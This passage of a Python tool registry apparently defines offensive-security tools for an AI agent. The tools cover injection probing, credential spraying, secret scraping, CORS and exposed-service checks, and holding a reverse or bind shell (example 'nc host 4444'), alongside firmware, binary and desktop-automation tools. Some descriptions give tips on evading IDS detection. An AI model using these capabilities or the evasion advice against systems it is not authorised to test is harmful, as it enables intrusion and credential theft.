                "values": {"type": "array", "items": {"type": "string"}, "description": "Explicit values to try."},
                "range": {"type": "array", "items": {"type": "integer"}, "description": "[start, end] integer range to try (inclusive)."},
            },
            "required": ["url"],
        },
        "fn": tool_fuzz,
    },
    "validate_finding": {
        "description": "AUTHORIZED PENTEST. Sanity-check a suspected finding before reporting it, to avoid false positives on decoys/catch-all/WAF pages. Diffs the url against a random-path baseline, classifies the response, and flags placeholder/decoy markers (example.invalid, 'placeholder', 'nothing sensitive', …). Returns likely_real + reasons so you don't report a honeypot.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "The URL of the suspected finding to validate."},
            },
            "required": ["url"],
        },
        "fn": tool_validate_finding,
    },
    "batch_probe": {
        "description": "AUTHORIZED PENTEST. Fire one payload set at EVERY parameter of MANY endpoints in a single call — 'try this against every parameterized endpoint' — instead of N×M manual http_request calls. Give `targets` (list of URLs with query params) and either `probe` (sqli|ssti|lfi|cmdi|xss) or your own `payloads`. Returns which endpoint+param+payload combos fired a signature (SQL error, template eval, /etc/passwd read, shell exec, reflection). Follow a hit up with sql_injection / http_request / fuzz.",
        "parameters": {
            "type": "object",
            "properties": {
                "targets": {"type": "array", "items": {"type": "string"}, "description": "URLs that carry query params, e.g. ['http://host/search?q=x','http://host/download?file=y']."},
                "probe": {"type": "string", "description": "Built-in class: sqli | ssti | lfi | cmdi | xss."},
                "payloads": {"type": "array", "items": {"type": "string"}, "description": "Custom payloads instead of a built-in class; hits = responses that differ from baseline."},
            },
            "required": ["targets"],
        },
        "fn": tool_batch_probe,
    },
    "scan_js_secrets": {
        "description": "AUTHORIZED PENTEST. Fetch a page + its inline/linked JavaScript and hunt for hardcoded secrets: cloud keys (AWS/Google/Stripe/Slack/GitHub/SendGrid/Twilio), JWTs, Firebase/Supabase endpoints, private keys, basic-auth URLs, and generic apiKey/secret/token='...' assignments. The 'scrape the front-end for keys' primitive. Read-only.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Page URL to scrape (its <script src> files are fetched and scanned too)."},
            },
            "required": ["url"],
        },
        "fn": tool_scan_js_secrets,
    },
    "cors_probe": {
        "description": "AUTHORIZED PENTEST. Test a URL for CORS misconfiguration — sends crafted Origin headers and checks whether the server reflects the origin into Access-Control-Allow-Origin, especially with Allow-Credentials:true (lets an attacker site read authenticated responses). Also flags 'null' origin and wildcard acceptance. Read-only.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Endpoint URL to test for CORS reflection."},
            },
            "required": ["url"],
        },
        "fn": tool_cors_probe,
    },
    "tcp_send": {
        "description": "AUTHORIZED PENTEST. Raw TCP: connect to host:port, send data, read the response within a window. Not a browser (bytes only, no JS/rendering). For non-HTTP services (redis, memcached, SMTP) or to submit a URL to a CTF / report-to-admin bot and read the console.log/output it pipes back. Set read_timeout high (e.g. 15) for a visit-and-wait bot. Optional tls.",
        "parameters": {
            "type": "object",
            "properties": {
                "host": {"type": "string", "description": "Target host (or host:port)."},
                "port": {"type": "integer", "description": "Target TCP port."},
                "data": {"type": "string", "description": "Bytes to send (add a trailing newline if the service expects line input)."},
                "read_timeout": {"type": "number", "description": "Seconds to read the response (default 8; use ~15 for a bot that visits a page)."},
                "tls": {"type": "boolean", "description": "Wrap the connection in TLS."},
            },
            "required": ["host", "port"],
        },
        "fn": tool_tcp_send,
    },
    "recon_subdomains": {
        "description": "AUTHORIZED RECON ONLY. Passive subdomain enumeration via certificate transparency logs (crt.sh). No active brute-forcing. Read-only.",
        "parameters": {
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Apex domain, e.g. example.com."}
            },
            "required": ["domain"],
        },
        "fn": tool_recon_subdomains,
    },
    "recon_dns": {
        "description": "AUTHORIZED RECON ONLY. Enumerate DNS records (A, AAAA, MX, NS, TXT, SOA, CNAME) via DNS-over-HTTPS. Read-only.",
        "parameters": {
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Domain to enumerate, e.g. example.com."}
            },
            "required": ["domain"],
        },
        "fn": tool_recon_dns,
    },
    "recon_content_discovery": {
        "description": "AUTHORIZED RECON ONLY. Probe a base URL for a high-value path list (admin panels, config/backup files, VCS dirs, API docs). Reports non-404 paths that differ from the catch-all baseline. Read-only. NOTE: a content IDS scores REQUESTS, not timing — to stay quiet against detection use quiet=true (a small high-signal set, ~10 requests) rather than relying on jitter.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Base URL or host."},
                "wordlist": {"type": "array", "items": {"type": "string"}, "description": "Optional custom path list. Default = built-in high-value paths."},
                "quiet": {"type": "boolean", "description": "Low-footprint sweep: ~10 highest-signal paths at low concurrency. Fewer requests = fewer detection triggers."},
                "concurrency": {"type": "integer", "description": "Max simultaneous requests (default 6, max 20)."},
                "jitter_ms": {"type": "integer", "description": "Delay before each request in ms — rate-limiting/politeness, NOT IDS evasion."}
            },
            "required": ["url"],
        },
        "fn": tool_recon_content_discovery,
    },
    "recon_check_exposure": {
        "description": "AUTHORIZED RECON ONLY. Targeted check for high-signal exposures and interprets them: readable .git, .env secrets, directory listing, Spring actuator, Apache server-status. Returns findings with severity + evidence. Read-only.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Base URL or host to check."}
            },
            "required": ["url"],
        },
        "fn": tool_recon_check_exposure,
    },
    "recon_subdomain_takeover": {
        "description": "AUTHORIZED RECON ONLY. Check subdomains for dangling-CNAME takeover by matching orphaned-service fingerprints (S3, GitHub Pages, Heroku, etc.). Read-only — does not claim anything.",
        "parameters": {
            "type": "object",
            "properties": {
                "subdomains": {"type": "array", "items": {"type": "string"}, "description": "Subdomains to check (e.g. from recon_subdomains)."},
                "domain": {"type": "string", "description": "Single host shortcut if not passing a list."}
            },
            "required": [],
        },
        "fn": tool_recon_subdomain_takeover,
    },
    "recon_cve_match": {
        "description": "AUTHORIZED RECON ONLY. Map a component + version to known CVEs via OSV.dev. Best for OSS packages (npm, PyPI, Go, Maven). Feed it components found in exposed package.json / requirements / JS libs.",
        "parameters": {
            "type": "object",
            "properties": {
                "package": {"type": "string", "description": "Component/package name."},
                "version": {"type": "string", "description": "Version string."},
                "ecosystem": {"type": "string", "description": "Optional: npm, PyPI, Go, Maven, etc. Improves precision."}
            },
            "required": ["package"],
        },
        "fn": tool_recon_cve_match,
    },
    "recon_injection_probe": {
        "description": "AUTHORIZED RECON ONLY. Non-destructive injection detection on URL query parameters: reflected XSS and error-based SQLi. Sends only benign probes (a marker and a quote). Read-only intent.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "URL including query string, e.g. https://site/search?q=test"},
                "params": {"type": "array", "items": {"type": "string"}, "description": "Optional explicit param names to test; default = params parsed from the URL."}
            },
            "required": ["url"],
        },
        "fn": tool_recon_injection_probe,
    },
    "recon_open_services": {
        "description": "AUTHORIZED RECON ONLY. Check for UNAUTHENTICATED data services exposed on the network (Redis, Elasticsearch, Docker API, Memcached). A live unauth hit is often a direct way in. Read-only probes.",
        "parameters": {
            "type": "object",
            "properties": {
                "host": {"type": "string", "description": "Target hostname or IP."}
            },
            "required": ["host"],
        },
        "fn": tool_recon_open_services,
    },
    "recon_auth_spray": {
        "description": "AUTHORIZED RECON ONLY. Credential spray / default-cred test against an HTTP login (basic or form auth). Rate-limited, attempt-capped, stops on first valid pair per user. Only for targets you are authorized to test.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Login URL (basic-auth resource, or form POST endpoint)."},
                "mode": {"type": "string", "description": "'basic' (HTTP Basic) or 'form' (POST). Default basic."},
                "usernames": {"type": "array", "items": {"type": "string"}, "description": "Usernames to try. Omit to use the built-in default-cred list."},
                "passwords": {"type": "array", "items": {"type": "string"}, "description": "Passwords to try against each username."},
                "user_field": {"type": "string", "description": "Form mode: username field name (default 'username')."},
                "pass_field": {"type": "string", "description": "Form mode: password field name (default 'password')."},
                "success_marker": {"type": "string", "description": "Form mode: body string present ONLY on success."},
                "fail_marker": {"type": "string", "description": "Form mode: body string present ONLY on failure."},
                "delay": {"type": "number", "description": "Seconds between attempts (default 0.4). Higher = stealthier, lockout-safer."},
                "max_attempts": {"type": "integer", "description": "Hard cap on total attempts (default 120, max 300)."}
            },
            "required": ["url"],
        },
        "fn": tool_recon_auth_spray,
    },
    "recon_capture_evidence": {
        "description": "AUTHORIZED RECON. Fetch a URL and store the response as a proof artifact under data/recon_evidence/ with a sha256 + snippet. Use to capture evidence of access (dumped file, admin page, authed response) so the report cites a real artifact.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "URL of the resource that proves access."},
                "label": {"type": "string", "description": "Short label for the artifact filename (e.g. 'env_dump')."}
            },
            "required": ["url"],
        },
        "fn": tool_recon_capture_evidence,
    },
    "check_deps": {
        "description": "Check dependency manifests against OSV.dev vulnerabilities. No approval needed.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Path to manifest file or directory."},
                "ecosystem": {"type": "string", "description": "Optional ecosystem override (e.g. PyPI, npm)."},
                "ignore": {"type": "array", "items": {"type": "string"}, "description": "List of vuln IDs to ignore."}
            },
            "required": ["path"],
        },
        "fn": tool_check_deps,
    },

    "list_directory": {
        "description": "List files and folders at a path. Use to explore.",
        "parameters": {
            "type": "object",
            "properties": {"path": {"type": "string", "description": "Absolute path. ~ and %VARS% expanded."}},
            "required": ["path"],
        },
        "fn": tool_list_directory,
    },
    "read_file": {
        "description": "Read a file from the workspace. Returns up to a 64KB chunk per call. For larger files, use the `offset` parameter (line number) to paginate — the response includes `total_lines` and a hint with the next offset to call. Calling read_file with identical args returns the SAME chunk; use offset to advance. Works on text, code, markdown, and binary files (returns best-effort decoded text). PDFs are auto-extracted to plain text page-by-page (requires pypdf); scanned image-only PDFs return a notice instead of garbage.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "offset": {
                    "type": "integer",
                    "description": "0-indexed starting line. Default 0. To read the next chunk of a truncated response, pass the previous response's `offset + lines_returned` (or just follow the `hint` field).",
                },
            },
            "required": ["path"],
        },
        "fn": tool_read_file,
    },
    "write_file": {
        "description": "Write or overwrite a file. Requires user approval. ONLY for new files or complete rewrites (>30 lines changed). For fixes to an existing file, prefer edit_file — repeatedly rewriting the whole file from scratch is blocked (use edit_file instead).",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "content": {"type": "string"},
                "force": {"type": "boolean", "description": "Override the anti-clobber guard to overwrite a file you haven't read this session. Use only when intentionally replacing the whole file."},
                "force_rewrite": {"type": "boolean", "description": "Override the rewrite-loop guard to fully rewrite a file you already rewrote this turn. Use ONLY with a concrete reason (e.g. a real syntax error you must fix wholesale)."},
            },
            "required": ["path", "content"],
        },
        "fn": tool_write_file,
    },
    "edit_file": {
        "description": (
            "Surgical search-and-replace edits on an existing file. "
            "PREFERRED for changes affecting ≤30 lines. Each edit finds old_text and replaces with new_text. "
            "old_text must appear exactly once in the file (unique). "
            "NEVER use this to rewrite an entire file — use write_file for that."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "edits": {
                    "type": "array",
                    "items": {
                        "type": "object",
                        "properties": {
                            "old_text": {"type": "string", "description": "exact text to find (must be unique in file)"},
                            "new_text": {"type": "string", "description": "replacement text"},
                        },
                        "required": ["old_text", "new_text"],
                    },
                },
            },
            "required": ["path", "edits"],
        },
        "fn": tool_edit_file,
    },
    "replace_ast_node": {
        "description": "Surgical AST-based replacement. Provide path, node_type, node_name, and new_text. The tool will parse the file using tree-sitter, find the exact node, and replace its bounds with your new text without relying on line numbers.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "node_type": {"type": "string", "description": "e.g., function_definition, class_definition, function_declaration"},
                "node_name": {"type": "string", "description": "The exact identifier name of the function or class"},
                "new_text": {"type": "string", "description": "The complete replacement code for the node"},
            },
            "required": ["path", "node_type", "node_name", "new_text"],
        },
        "fn": tool_replace_ast_node,
    },
    "find_references": {
        "description": "Find deterministic references to a symbol (function, class, variable) across the workspace using AST. Returns exact files and line numbers.",
        "parameters": {
            "type": "object",
            "properties": {
                "symbol": {"type": "string", "description": "The exact identifier name to search for (e.g. renderMarkdown)"},
            },
            "required": ["symbol"],
        },
        "fn": tool_find_references,
    },
    "delete_file": {
        "description": "Delete a file or folder. Requires user approval.",
        "parameters": {
            "type": "object",
            "properties": {"path": {"type": "string"}},
            "required": ["path"],
        },
        "fn": tool_delete_file,
    },
    "run_powershell": {
        "description": "Run a PowerShell command. Read-only commands run freely; write/modify commands require approval.",
        "parameters": {
            "type": "object",
            "properties": {
                "command": {"type": "string"},
                "timeout": {"type": "integer", "description": "seconds, default 120"},
            },
            "required": ["command"],
        },
        "fn": tool_run_powershell,
    },
    "session_start": {
        "description": "Open a PERSISTENT interactive session — a long-lived process you drive statefully across turns (unlike run_powershell, which is one-shot and loses all state: cwd, env, connections). Use it to hold a shell you obtained (reverse/bind shell, ssh), or a REPL / DB client / debugger (python, sqlite3, gdb). `command` is the process to launch (defaults to a local shell). Returns a session_id + initial output; then use session_send / session_read / session_stop. The user can watch and type into the same session live in the Shell tab. Requires approval to start.",
        "parameters": {
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "Process/command line to launch, e.g. 'powershell', 'ssh user@host', 'nc host 4444', 'python'. Defaults to a local shell."},
                "cwd": {"type": "string", "description": "Optional working directory to start in."},
                "wait_ms": {"type": "integer", "description": "Milliseconds to wait for initial output before returning (default 600, max 6000)."},
            },
            "required": [],
        },
        "fn": tool_session_start,
    },
    "session_send": {
        "description": "Send a line of input to a running interactive session (from session_start) — run a command inside the held shell / type into the REPL — and return the new output. State persists between calls. Write/modify inputs may require approval.",
        "parameters": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string", "description": "The id returned by session_start."},
                "input": {"type": "string", "description": "The line to send (a newline is added unless enter=false)."},
                "enter": {"type": "boolean", "description": "Append a newline / press Enter. Default true."},
                "wait_ms": {"type": "integer", "description": "Milliseconds to wait for output after sending (default 700, max 6000)."},
            },
            "required": ["session_id", "input"],
        },
        "fn": tool_session_send,
    },
    "session_read": {
        "description": "Read any NEW output from a running interactive session since your last read (for output that arrives slowly, or after a long-running command). Pass wait_ms to block briefly for more.",
        "parameters": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string", "description": "The session id."},
                "wait_ms": {"type": "integer", "description": "Milliseconds to wait for more output before returning (default 0, max 6000)."},
            },
            "required": ["session_id"],
        },
        "fn": tool_session_read,
    },
    "session_stop": {
        "description": "Terminate a running interactive session and free its process.",
        "parameters": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string", "description": "The session id to stop."},
            },
            "required": ["session_id"],
        },
        "fn": tool_session_stop,
    },
    "session_list": {
        "description": "List active interactive sessions (id, command, alive, exit_code).",
        "parameters": {"type": "object", "properties": {}, "required": []},
        "fn": tool_session_list,
    },
    "open_program": {
        "description": "Launch a program by absolute path. Requires approval.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "args": {"type": "array", "items": {"type": "string"}},
            },
            "required": ["path"],
        },
        "fn": tool_open_program,
    },
    "web_search": {
        "description": (
            "Search the web for current information (news, weather, prices, docs, "
            "anything time-sensitive). Returns a list of {title, url, snippet}. "
            "Follow up with web_fetch on the most promising URLs to read full text."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "query": {"type": "string", "description": "search query, plain english"},
                "max_results": {"type": "integer", "description": "1-20, default 6"},
            },
            "required": ["query"],
        },
        "fn": tool_web_search,
    },
    "web_fetch": {
        "description": "Fetch a URL and return stripped text content. Use after web_search to read a specific page.",
        "parameters": {
            "type": "object",
            "properties": {"url": {"type": "string"}},
            "required": ["url"],
        },
        "fn": tool_web_fetch,
    },
    "network_snapshot": {
        "description": (
            "Snapshot the host's current network state. Returns active TCP "
            "connections (with owning process names), UDP listeners, top remote "
            "destinations, and the recent DNS resolver cache. No admin required, "
            "no install. Use to spot weird traffic — unknown processes phoning "
            "home, unexpected open ports, suspicious resolved domains. Windows-only "
            "for now. Each call requires user approval."
        ),
        "parameters": {
            "type": "object",
            "properties": {},
        },
        "fn": tool_network_snapshot,
    },
    "remember": {
        "description": (
            "Save a terse lesson (<= 220 chars) to long-term memory so future "
            "sessions start smarter. Long-term memory is durable across chats — "
            "use ONLY for facts that stay true: a working command, a file "
            "layout, a user preference. Never store the current task, the chat "
            "transcript, or anything that belongs in short-term memory (the "
            "model's own thinking, kept inside this chat automatically)."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "text": {"type": "string", "description": "the lesson, single sentence ideally"},
                "tags": {"type": "array", "items": {"type": "string"}, "description": "2-3 short tags for recall"},
            },
            "required": ["text"],
        },
        "fn": tool_remember,
    },
    "forget": {
        "description": "Drop a long-term memory by id (returned by `remember`).",
        "parameters": {
            "type": "object",
            "properties": {"id": {"type": "string"}},
            "required": ["id"],
        },
        "fn": tool_forget,
    },
    "edit_memory": {
        "description": "Edit an existing long-term memory by id.",
        "parameters": {
            "type": "object",
            "properties": {
                "id": {"type": "string", "description": "the memory id"},
                "text": {"type": "string", "description": "the updated text"},
                "tags": {"type": "array", "items": {"type": "string"}, "description": "updated tags"},
            },
            "required": ["id", "text"],
        },
        "fn": tool_edit_memory,
    },
    # ---- desktop automation (gated behind settings + approvals) ----
    "screenshot": {
        "description": (
            "Capture the screen (or a rectangular region) and return a base64 PNG. "
            "Read-only. Prefer `describe_screen` over this for reasoning — describe_screen "
            "runs the image through the vision model so the main model only sees text."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "x": {"type": "integer", "description": "region left (optional)"},
                "y": {"type": "integer", "description": "region top (optional)"},
                "w": {"type": "integer", "description": "region width (optional)"},
                "h": {"type": "integer", "description": "region height (optional)"},
            },
        },
        "fn": tool_screenshot,
    },
    "describe_screen": {
        "description": (
            "Take a screenshot and ask the local vision model to describe it. "
            "Returns a text description including visible UI text, button labels, "
            "window titles, and app state. Use this as the agent's 'eyes' every "
            "time you need to observe the screen — the main model never sees pixels."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "hint": {"type": "string", "description": "optional context for the vision model, e.g. 'look for update notifications'"},
                "x": {"type": "integer"},
                "y": {"type": "integer"},
                "w": {"type": "integer"},
                "h": {"type": "integer"},
            },
        },
        "fn": tool_describe_screen,
    },
    "list_windows": {
        "description": "List visible top-level windows with their title and bounding box.",
        "parameters": {"type": "object", "properties": {}},
        "fn": tool_list_windows,
    },
    "desktop_launch_app": {
        "description": (
            "Launch an application. The target must appear in the user's desktop "
            "allowlist (Settings -> Desktop automation) or the call is refused. "
            "Requires approval. `name` can be a PATH-resolvable exe ('notepad', "
            "'chrome') or an absolute path."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "name": {"type": "string", "description": "exe name or absolute path"},
            },
            "required": ["name"],
        },
        "fn": tool_desktop_launch_app,
    },
    "desktop_focus_window": {
        "description": "Bring a window to the foreground by title substring (case-insensitive). Requires approval.",
        "parameters": {
            "type": "object",
            "properties": {"title": {"type": "string", "description": "substring of target window title"}},
            "required": ["title"],
        },
        "fn": tool_desktop_focus_window,
    },
    "desktop_click": {
        "description": (
            "Click the mouse at screen pixel (x, y). Derive coords from "
            "describe_screen + list_windows; never guess. Requires approval."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "x": {"type": "integer"},
                "y": {"type": "integer"},
                "button": {"type": "string", "enum": ["left", "right", "middle"], "description": "default left"},
                "clicks": {"type": "integer", "description": "1-3, default 1"},
            },
            "required": ["x", "y"],
        },
        "fn": tool_desktop_click,
    },
    "desktop_type_text": {
        "description": "Type a literal string into the currently focused control. Requires approval. Max 2000 chars.",
        "parameters": {
            "type": "object",
            "properties": {"text": {"type": "string"}},
            "required": ["text"],
        },
        "fn": tool_desktop_type_text,
    },
    "desktop_press_keys": {
        "description": "Press a key or combo like 'enter', 'ctrl+s', 'alt+tab', 'win'. Requires approval.",
        "parameters": {
            "type": "object",
            "properties": {"keys": {"type": "string"}},
            "required": ["keys"],
        },
        "fn": tool_desktop_press_keys,
    },
    "desktop_close_window": {
        "description": "Close a window by title substring. Requires approval.",
        "parameters": {
            "type": "object",
            "properties": {"title": {"type": "string"}},
            "required": ["title"],
        },
        "fn": tool_desktop_close_window,
    },
    # ---- firmware analysis -------------------------------------------------
    "binwalk_scan": {
        "description": "Scan a binary file for embedded archives, filesystems, and known signatures. Use first on unknown firmware blobs to find offsets.",
        "parameters": {
            "type": "object",
            "properties": {"path": {"type": "string"}},
            "required": ["path"],
        },
        "fn": tool_binwalk_scan,
    },
    "strings_dump": {
        "description": "Extract printable ASCII strings from a binary, optional regex filter. Good for finding hardcoded creds, URLs, paths, default passwords.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "min_length": {"type": "integer", "description": "minimum run length, default 8"},
                "pattern": {"type": "string", "description": "regex filter, optional"},
                "max_results": {"type": "integer", "description": "default 500, max 5000"},
                "max_bytes": {"type": "integer", "description": "default 16MB, max 64MB"},
            },
            "required": ["path"],
        },
        "fn": tool_strings_dump,
    },
    "file_inspect": {
        "description": "Identify a file by magic bytes. For ELF binaries also reports architecture, type, entry point, interpreter, and strip status.",
        "parameters": {
            "type": "object",
            "properties": {"path": {"type": "string"}},
            "required": ["path"],
        },
        "fn": tool_file_inspect,
    },
    "read_bytes": {
        "description": "Read raw bytes at an offset. Returns hex + printable ASCII view. Use to inspect a header or an offset surfaced by binwalk_scan.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "offset": {"type": "integer", "description": "byte offset, default 0"},
                "length": {"type": "integer", "description": "bytes to read, default 256, max 4096"},
            },
            "required": ["path"],
        },
        "fn": tool_read_bytes,
    },
    "find_files": {
        "description": "Recursive file search under a directory with optional glob and size cap. Triages extracted firmware roots without reading every file.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "directory to search"},
                "pattern": {"type": "string", "description": "glob like *.cgi, default *"},
                "max_size": {"type": "integer", "description": "skip files larger than this (bytes), 0 = no cap"},
                "max_results": {"type": "integer", "description": "default 500, max 5000"},
            },
            "required": ["path"],
        },
        "fn": tool_find_files,
    },
    "extract_archive": {
        "description": "Auto-detect and extract gzip/tar/zip/xz/bzip2/squashfs into a sandbox folder next to the source. Requires user approval.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "dest_name": {"type": "string", "description": "subfolder name, default <stem>_extracted"},
                "overwrite": {"type": "boolean", "description": "replace existing destination"},
            },
            "required": ["path"],
        },
        "fn": tool_extract_archive,
    },
    "carve_file": {
        "description": (
            "Carve a byte range out of a source file into a new file in the "
            "same directory. Use when binwalk_scan surfaces an embedded "
            "gzip/squashfs/etc inside a custom container (e.g. the 0xd00dfe "
            "TP-Link/ASUS .pkgtb wrapper) — carve the range, then run "
            "extract_archive or extract_squashfs on the carved file. "
            "length=0 carves to EOF. Requires user approval."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "source file"},
                "offset": {"type": "integer", "description": "start byte, default 0"},
                "length": {"type": "integer", "description": "bytes to copy, 0 = to EOF"},
                "dest_name": {"type": "string", "description": "output filename, default <stem>_at_0x<offset>.bin"},
                "overwrite": {"type": "boolean", "description": "replace existing destination"},
                "max_bytes": {"type": "integer", "description": "safety cap, default 512MB, max 2GB"},
            },
            "required": ["path"],
        },
        "fn": tool_carve_file,
    },
    "extract_squashfs": {
        "description": (
            "Extract a squashfs filesystem image (hsqs/sqsh magic) into a "
            "sandbox folder next to the source. Pure-Python via PySquashfsImage "
            "— no system squashfs-tools needed. Use AFTER you've located a "
            "squashfs.img (e.g. via binwalk_scan + extract_archive on a tar). "
            "Requires user approval."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "absolute path to a .img/.sqsh squashfs file"},
                "dest_name": {"type": "string", "description": "subfolder name, default <stem>_rootfs"},
                "overwrite": {"type": "boolean", "description": "replace existing destination"},
            },
            "required": ["path"],
        },
        "fn": tool_extract_squashfs,
    },
    "grep_files": {
        "description": (
            "Recursive regex search across a directory tree. Returns matches "
            "with file path, line number, and the matched line. Skips binaries "
            "(null-byte heuristic) and noise dirs (.git, node_modules, etc). "
            "Best for searching extracted firmware roots — find CGI handlers, "
            "system()/sprintf calls, hardcoded creds, auth strings, etc."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "directory to search"},
                "pattern": {"type": "string", "description": "Python regex"},
                "glob": {"type": "string", "description": "filename glob filter, e.g. *.cgi or *.sh"},
                "case_insensitive": {"type": "boolean", "description": "default false"},
                "max_matches": {"type": "integer", "description": "default 200, max 2000"},
                "max_files": {"type": "integer", "description": "default 5000, max 50000"},
            },
            "required": ["path", "pattern"],
        },
        "fn": tool_grep_files,
    },
    "disasm_at": {
        "description": (
            "Disassemble N instructions at a file offset using capstone. "
            "Auto-detects arch/endianness from ELF header; pass arch explicitly "
            "for raw blobs. Supported: x86, x64, arm, thumb, arm64, mips, "
            "mips64, ppc, ppc64. Use to inspect a function near an offset "
            "surfaced by binwalk_scan or a string xref."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "offset": {"type": "integer", "description": "byte offset into file, default 0"},
                "count": {"type": "integer", "description": "number of instructions, default 32, max 256"},
                "arch": {"type": "string", "description": "x86|x64|arm|thumb|arm64|mips|mips64|ppc|ppc64 (auto for ELF)"},
                "mode": {"type": "string", "description": "le|be (auto for ELF)"},
                "address": {"type": "integer", "description": "virtual address for display, default = offset"},
                "max_bytes": {"type": "integer", "description": "bytes to read, default 4096, max 16384"},
            },
            "required": ["path"],
        },
        "fn": tool_disasm_at,
    },
    "scan_apk": {
        "description": (
            "Static APK security scan. Pure-Python, no approval needed. Returns ONE "
            "structured report: package metadata, signing certs, permissions (with "
            "dangerous ones flagged), exported components, dex/native lib inventory, "
            "and a regex-driven secret hunt over DEX + .so files (AWS/GCP/Firebase "
            "keys, JWTs, GitHub PATs, Stripe keys, hardcoded URLs, etc). Lead any "
            "APK investigation with this tool — the risk_summary field surfaces the "
            "highlights. Use decompile_apk afterward for class-level reading."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Path to .apk in the workspace"},
                "deep": {"type": "boolean", "description": "Scan every file, not just dex/so. Slower; useful for hunting secrets in assets."},
                "max_secret_findings": {"type": "integer", "description": "default 200, max 2000"},
                "max_string_bytes": {"type": "integer", "description": "byte cap for the secret hunt across all files combined. default 8MB, max 64MB"},
            },
            "required": ["path"],
        },
        "fn": tool_scan_apk,
    },
    "ghidra_analyze": {
        "description": (
            "Static analysis of a native binary (ELF/PE/Mach-O/.so/.dll/.exe) "
            "using Ghidra in-process via pyghidra. Returns format, imports, "
            "exports, defined strings, function listing, and a risk_summary "
            "flagging dangerous imports (strcpy/system/dlopen/etc). Pass "
            "function='name' + decompile=true to get C-like pseudocode for "
            "one function. Requires JDK 21+, pyghidra, and a Ghidra install "
            "(settings.ghidra_path or $GHIDRA_INSTALL_DIR). Pairs well with "
            "scan_apk + decompile_apk: use this on .so files inside APKs that "
            "JADX can't decompile."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Path to the binary in the workspace"},
                "function": {"type": "string", "description": "Optional function name to target. Required for decompile=true."},
                "decompile": {"type": "boolean", "description": "Decompile the named function to C-like pseudocode. Default false."},
                "max_strings": {"type": "integer", "description": "Cap on defined strings returned. default 200, max 2000"},
                "max_functions": {"type": "integer", "description": "Cap on function listing entries. default 200, max 5000"},
                "timeout": {"type": "integer", "description": "Hard timeout in seconds. default 240, max 1800"},
            },
            "required": ["path"],
        },
        "fn": tool_ghidra_analyze,
    },
    "decompile_apk": {
        "description": (
            "Decompile an APK to readable Java sources using JADX (external tool). "
            "Writes output into a sandbox subdirectory next to the APK. Requires "
            "Java 11+ and JADX installed; set settings.jadx_path if jadx is not "
            "on PATH. Destructive — gated by approval. After decompile, navigate "
            "with read_file / grep_files. Pass classes='com.target.foo.*' to "
            "scope output and finish faster on large APKs."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Path to .apk in the workspace"},
                "dest_name": {"type": "string", "description": "Single folder name (no slashes). Default: <apk_stem>_jadx"},
                "overwrite": {"type": "boolean", "description": "Replace dest if it exists. Default false."},
                "classes": {"type": "string", "description": "Optional jadx --include-classes glob, e.g. 'com.target.auth.*'"},
                "deobf": {"type": "boolean", "description": "Run jadx --deobf to rename obfuscated symbols. Default true."},
                "show_bad_code": {"type": "boolean", "description": "Keep classes that partially failed to decompile. Default true."},
                "no_res": {"type": "boolean", "description": "Skip resources, source-only. Faster on huge APKs."},
                "no_src": {"type": "boolean", "description": "Skip source, resources-only."},
                "timeout": {"type": "integer", "description": "Hard timeout in seconds. default 600, max 3600"},
            },
            "required": ["path"],
        },
        "fn": tool_decompile_apk,
    },
    "binary_inspect": {
        "description": (
            "Fast PE/ELF/Mach-O triage. Returns format, arch, sections (with "
            "entropy + R/W/X flags), imports per DLL, exports, packer hints, "
            "Authenticode signature presence, hashes, and a risk_summary that "
            "flags dangerous imports + high-entropy sections. Pure-Python, no "
            "approval, ~50ms on a typical exe. Lead native-binary investigations "
            "with this — only escalate to ghidra_analyze if the triage looks "
            "interesting (unsigned + dangerous imports + packed section)."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Path to the binary in the workspace"},
            },
            "required": ["path"],
        },
        "fn": tool_binary_inspect,
    },
    "yara_scan": {
        "description": (
            "Scan a file or directory with YARA pattern rules. Defaults to a "
            "bundled rule set covering common malware tells (suspicious URLs, "
